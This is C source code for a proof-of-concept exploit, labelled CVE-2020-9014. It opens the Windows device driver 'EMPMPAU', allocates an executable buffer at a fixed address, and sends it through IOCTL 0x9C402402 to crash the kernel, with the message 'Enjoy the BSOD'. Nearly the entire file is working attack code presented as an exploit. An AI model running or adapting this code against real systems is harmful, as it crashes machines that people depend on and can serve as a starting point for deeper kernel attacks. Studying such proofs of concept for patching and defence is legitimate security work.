#include <stdio.h>
#include <tchar.h>
#include <Windows.h>

int main()
{
	HANDLE hDevice;
	LPCSTR lpDeviceName = "\\\\.\\EMPMPAU";
	DWORD bResult;
	DWORD junk = 0;

	printf("[+] CVE-2020-9014 - BSOD POC exploit \n\n===== Author - FULLSHADE, FullPwn Operations =====\n\n");
	printf("[+] Getting a handle to the Driver: %s\n", lpDeviceName);
	Sleep(500);

	hDevice = CreateFileA(lpDeviceName,
			GENERIC_READ | GENERIC_WRITE,
			FILE_SHARE_WRITE,
			NULL,
			OPEN_EXISTING,
			FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
			NULL);

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		printf(" -> Unable to get Driver handle!\n\n");
		exit(1);
	}

	printf("[+] Our Device Handle: 0x%p\n", hDevice);
	Sleep(500);

    printf("[+] Allocating Memory For Buffer\n");
    Sleep(500);
    LPVOID UserModeBuffer = VirtualAlloc((LPVOID)0x41000000, 0x10000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if(!UserModeBuffer){
    	wprintf(L"[!] Failed to allocate memory: 0x%p\n\n");
    }
    else {
    	wprintf(L"[+] Memory Allocated: @ 0x%08X, of %d bytes\n", UserModeBuffer , 0x10000);
    	Sleep(500);
    }

    printf("[+] IOCTL in use: 0x9C402402\n\n");
    printf("-------------------Kernel Mode-------------------\n\n");
    printf("[+] Sending payload to the driver \n");
    Sleep(500);
    printf("[+] Enjoy the BSOD \n");
	bResult = DeviceIoControl(hDevice,
			0x9C402402,
			UserModeBuffer,
			0x478,
			NULL, 0,
			&junk,
			(LPOVERLAPPED)NULL);

	if (!bResult) {
		wprintf(L" -> Failed to send Data!\n\n");
		CloseHandle(hDevice);
		exit(1);
	}

	printf(" [-] Error sending data, PoC failed...");
	CloseHandle(hDevice);
	return 0;
}
